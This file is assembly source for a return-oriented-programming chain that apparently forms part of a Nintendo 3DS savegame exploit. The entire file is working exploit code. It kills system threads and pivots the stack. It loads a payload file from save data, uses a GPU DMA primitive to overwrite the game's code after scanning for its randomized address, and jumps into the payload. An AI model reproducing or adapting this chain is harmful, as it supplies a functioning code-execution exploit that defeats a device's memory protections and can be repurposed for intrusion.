.nds

.include "coe_save/coe_constants.s"
.include "coe_save/coe_macros.s"

.create "build/rop.bin", COE_ROP_BASE

rop:
    ; kill gxlow InterruptReceiver thread
    .word COE_ROP_POP_R0PC
        .word COE_SVC_EXITTHREAD
    str_r0 COE_GSPGPU_INTERRUPT_RECEIVER_STRUCT+0x10+(0x0*0x4)
    str_r0 COE_GSPGPU_INTERRUPT_RECEIVER_STRUCT+0x10+(0x1*0x4)
    str_r0 COE_GSPGPU_INTERRUPT_RECEIVER_STRUCT+0x10+(0x2*0x4)
    str_r0 COE_GSPGPU_INTERRUPT_RECEIVER_STRUCT+0x10+(0x3*0x4)
    str_r0 COE_GSPGPU_INTERRUPT_RECEIVER_STRUCT+0x10+(0x4*0x4)
    str_r0 COE_GSPGPU_INTERRUPT_RECEIVER_STRUCT+0x10+(0x5*0x4)
    str_r0 COE_GSPGPU_INTERRUPT_RECEIVER_STRUCT+0x10+(0x6*0x4)

    ; kill GameStateManager thread
    str_val COE_GAMESTATEMANAGER_EXIT, 0

    ; kill APT client thread
    set_lr COE_ROP_NOP
    .word COE_APT_FINALIZECLIENTTHREAD

    ; if not N3DS, calculate pivot such that we skip setting variables
    .word COE_ROP_POP_R0PC
        .word 0x1FF80030
    cmpne_derefptr_r0addr 6, (appmemtype_write_skip_after - appmemtype_write_skip)
    add_r0 appmemtype_write_skip

    ; set pivot target
    str_r0 pivot_struct + 8

    ; do pivot
    .word COE_ROP_POP_R4R5R6R7R8R9R10R11PC
        .word 0xDEADBABE
        .word 0xDEADBABE
        .word 0xDEADBABE
        .word 0xDEADBABE
        .word pivot_struct
        .word 0xDEADBABE
        .word 0xDEADBABE
        .word 0xDEADBABE
    .word COE_ROP_LDMIB_R8_R12SPLRPC

    ; If we have appmemtype 6 (N3DS default), set variables accordingly
appmemtype_write_skip:

    .word COE_ROP_POP_R0PC
        .word COE_CODE_LINEAR_BASE_N3DS
    str_r0 code_linear_base
    ldr_add_r0 scanloop_curptr_appmemtype, (COE_CODE_LINEAR_BASE_N3DS - COE_CODE_LINEAR_BASE_O3DS)
    str_r0 scanloop_curptr_appmemtype

appmemtype_write_skip_after:

    ; Read initial payload from savegame to linear
    FSUSER_OpenFileDirectly file_handle, 0, ARCHIVE_SAVEDATA, PATH_EMPTY, empty_string, 0x1, PATH_ASCII, payload_file, (payload_file_end - payload_file), FS_OPEN_READ, 0x0
    FSFILE_GetSize file_handle, payload_size
    FSFILE_Read file_handle, payload_bytes_read, 0, 0, COE_LINEAR_BUFFER, payload_size
    FSFILE_Close file_handle

    ; Flush to RAM
    flush_dcache COE_LINEAR_BUFFER, 0x00100000

    ; Copy out our entire codebin to linear
    gspwn_srcderefadd COE_CODEBIN_BUFFER, 0, code_linear_base, COE_CODEBIN_SIZE
    svcSleepThread 200*1000*1000, 0x00000000

    ; GSPGPU::InvalidateDataCache(COE_CODEBIN_BUFFER, COE_CODEBIN_SIZE)
        .word COE_ROP_POP_R4R5PC
            .word tls_struct ; r4 (lock structure)
            .word 0xDEADBABE ; r5 (garbage)

        .word COE_ROP_TLS
            .word 0xDEADBABE ; r4 (garbage)

        ; get dat TLS in r4
        ldr_r0 tls_struct + 4
        str_r0 tls_r4

        .word COE_ROP_POP_R0PC ; pop {r0, pc}
            .word COE_GSPGPU_HANDLE ; r0 (handle ptr)
        .word COE_ROP_POP_R1PC ; pop {r1, pc}
            .word 0xFFFF8001 ; r1 (process handle)
        .word COE_ROP_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
            .word COE_CODEBIN_BUFFER ; r2 (addr)
            .word COE_CODEBIN_SIZE ; r3 (size)
            tls_r4:
            .word 0xF00FF00F ; (filled in later)
            .word 0x90082 ; GSPGPU::InvalidateDataCache
            .word 0xDEADBABE ; r6 (garbage)
        .word (COE_GSPGPU_FLUSHDATACACHE + 12)
            .word 0xDEADBABE ; r4 (garbage)
            .word 0xDEADBABE ; r5 (garbage)
            .word 0xDEADBABE ; r6 (garbage)

    ; Prepare PASLR scan
    str_val scanloop_curptr, COE_CODEBIN_BUFFER - COE_SCANLOOP_STRIDE + COE_SCANLOOP_ADD

    ; Scan for the PASLR shift
scan_loop:

    ; increment ptr
    ldr_add_r0 scanloop_curptr_appmemtype, COE_SCANLOOP_STRIDE
    str_r0 scanloop_curptr_appmemtype
    ldr_add_r0 scanloop_curptr, COE_SCANLOOP_STRIDE
    str_r0 scanloop_curptr

    ; compare *ptr to magic value
    cmp_derefptr_r0addr COE_SCANLOOP_MAGICVAL, (scan_loop_exit - scan_loop_continue)
    add_r0 scan_loop_continue

    ; pivot either to the end of the loop, or to the continue pivot
        ; set pivot target
        str_r0 pivot_struct + 8

        ; do pivot
        .word COE_ROP_POP_R4R5R6R7R8R9R10R11PC
            .word 0xDEADBABE
            .word 0xDEADBABE
            .word 0xDEADBABE
            .word 0xDEADBABE
            .word pivot_struct
            .word 0xDEADBABE
            .word 0xDEADBABE
            .word 0xDEADBABE
        .word COE_ROP_LDMIB_R8_R12SPLRPC

    ; pivot back to the start (next iteration)
    scan_loop_continue:
        ; set pivot target
        .word COE_ROP_POP_R0PC
            .word scan_loop
        str_r0 pivot_struct + 8

        ; do pivot
        .word COE_ROP_POP_R4R5R6R7R8R9R10R11PC
            .word 0xDEADBABE
            .word 0xDEADBABE
            .word 0xDEADBABE
            .word 0xDEADBABE
            .word pivot_struct
            .word 0xDEADBABE
            .word 0xDEADBABE
            .word 0xDEADBABE
        .word COE_ROP_LDMIB_R8_R12SPLRPC

scan_loop_exit:

    ; DMA payload
    gspwn_dstderefadd 0, scanloop_curptr_appmemtype, COE_LINEAR_BUFFER, 0x4000
    svcSleepThread 200*1000*1000, 0

    ; Jump to payload
    ldr_add_r0 scanloop_curptr, 0x100000000 - COE_CODEBIN_BUFFER - COE_SCANLOOP_ADD
    .word PAYLOAD_VA

    .word 0xDEAF0000

scanloop_curptr:
    .word 0xF00FF00F
scanloop_curptr_appmemtype:
    .word COE_CODE_LINEAR_BASE_O3DS - COE_SCANLOOP_STRIDE

code_linear_base:
    .word COE_CODE_LINEAR_BASE_O3DS;

pivot_struct:
    .word 0xDEADBABE ; garbage (increment-before)
    .word 0xF00F0001 ; r12
    .word 0xF00F0002 ; sp
    .word 0xF00F0003 ; lr
    .word COE_ROP_NOP ; pc

tls_struct:
    .word 0xDEADBABE
    .word 0xDEAD0002 ; thread TLS pointer (populated later)
    .word 0

file_handle:
    .word 0x0

empty_string:
    .word 0x0

payload_size:
    .word 0x0
    .word 0x0

payload_bytes_read:
    .word 0x0
    .word 0x0

payload_file:
    .ascii "/code.bin",0
payload_file_end:

.close
